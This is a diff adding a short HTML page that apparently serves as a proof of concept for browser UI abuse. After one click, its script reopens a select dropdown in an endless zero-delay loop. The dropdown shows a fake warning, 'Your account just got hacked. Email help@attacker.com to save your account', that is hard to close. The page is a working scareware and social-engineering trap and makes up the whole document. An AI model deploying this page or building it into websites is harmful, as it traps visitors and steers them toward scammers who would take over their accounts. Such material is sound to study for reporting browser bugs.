@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<style>
+  select {
+    all: initial;
+    text-align: center;
+    width: 50vw;
+    font-size: 1.5rem;
+  }
+
+  center {
+    margin-top: 25vh;
+  }
+
+  option {
+    height: 100vh;
+  }
+</style>
+
+<body>
+  <center>
+    <select id="mySelect">
+      <option disabled>&emsp;</option>
+      <option disabled></option>
+      <option disabled></option>
+      <option disabled>&emsp;&emsp;Your account just got hacked. Email help@attacker.com to save your account.</option>
+      <option disabled></option>
+      <option disabled></option>
+      <option disabled></option>
+    </select>
+    <h1>Click Anywhere</h1>
+  </center>
+</body>
+<script>
+  var selectElement = document.getElementById("mySelect");
+
+  window.addEventListener('click', function () {
+
+    setInterval(function () {
+      selectElement.showPicker();
+    }, 0);
+  });
+</script>
+
+</html>
